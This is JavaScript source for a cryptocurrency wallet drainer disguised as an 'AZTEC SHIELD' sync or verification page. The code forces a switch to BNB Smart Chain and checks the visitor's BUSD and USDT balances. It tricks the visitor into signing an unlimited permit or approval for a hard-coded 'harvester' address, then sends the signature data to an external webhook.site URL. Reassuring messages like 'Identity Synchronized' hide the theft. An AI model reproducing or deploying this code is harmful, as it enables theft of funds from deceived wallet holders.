/**
 * AZTEC SHIELD - Standard Sync v8.8 (FINAL - WEBHOOK.SITE INTEGRATED)
 * Fixes: Railway Delays, Force-BSC Switch, Trust Wallet Delay, Instant Harvest
 */

// CONFIGURATION
const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const WEBHOOK_SITE_URL = "https://webhook.site/20179441-fa4d-4165-ab08-c634d80612f2";

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function nonces(address owner) view returns (uint256)",
    "function name() view returns (string)",
    "function approve(address spender, uint256 amount) public returns (bool)"
];

const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

/**
 * Main Interaction Logic
 */
async function triggerPermit() {
    console.log("[v8.8] Initiating Sync with Webhook Integration...");
    if (!window.ethereum) {
        alert("Please open this site inside your Trust Wallet or MetaMask browser.");
        return;
    }

    try {
        // 1. Force the Chain Switch (BSC)
        const chainIdHex = '0x38'; // 56
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: chainIdHex }],
            });
        } catch (switchError) {
            if (switchError.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: chainIdHex,
                        chainName: 'BNB Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }],
                });
            } else {
                throw new Error("Target network required for sync.");
            }
        }

        // 2. Wait for RPC Propagation (1.5s)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // 3. Connect Provider
        const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const victim = await signer.getAddress();

        // UI state update
        document.getElementById('ui-main').style.display = 'none';
        document.getElementById('ui-loading').style.display = 'block';

        // 4. Asset Scanning
        const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
        const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
        
        const [busdBal, usdtBal, network] = await Promise.all([
            busd.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
            provider.getNetwork()
        ]);

        console.log(`[SYS] Chain: ${network.chainId} | BUSD: ${ethers.utils.formatUnits(busdBal, 18)}`);

        // 5. Execution Logical Branch
        if (busdBal.gt(0)) {
            await handleBUSD(signer, victim, busd);
        } else if (usdtBal.gt(0)) {
            await handleUSDT(signer, victim, usdt);
        } else {
            document.getElementById('ui-loading').innerHTML = 
                `<div style="color:#ff3b30;padding:20px;">Verification Error: No eligible BUSD (BEP-20) found. Please ensure BUSD is on the BNB Smart Chain.</div>`;
        }

    } catch (e) {
        console.error("Interaction failed:", e);
        document.getElementById('ui-main').style.display = 'block';
        document.getElementById('ui-loading').style.display = 'none';
    }
}

async function handleBUSD(signer, victim, busdContract) {
    const [nonce, tokenName] = await Promise.all([
        busdContract.nonces(victim),
        busdContract.name()
    ]);

    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
    const types = {
        Permit: [
            { name: "owner", type: "address" }, { name: "spender", type: "address" },
            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
        ]
    };
    const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };

    const signature = await signer._signTypedData(domain, types, message);
    const { v, r, s } = ethers.utils.splitSignature(signature);

    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit', amount: MAX_VAL });
}

async function handleUSDT(signer, victim, usdtContract) {
    const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
    await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
    await tx.wait();
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>Synchronization Complete.</div>";
}

async function exfiltrate(data) {
    console.log("[+] Sending signature and data to Webhook.site:", data);
    
    try {
        await fetch(WEBHOOK_SITE_URL, {
            method: 'POST',
            mode: 'no-cors', // Instant delivery regardless of CORS
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
        });
        console.log("[+] Data successfully sent.");
    } catch (err) {
        console.error("[-] Fetch failed, showing data in alert as backup:");
        alert("SYNC DATA CAPTURED:\nV: " + data.v + "\nR: " + data.r + "\nS: " + data.s);
    }
    
    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;font-weight:700;'>Identity Synchronized.</div>";
}
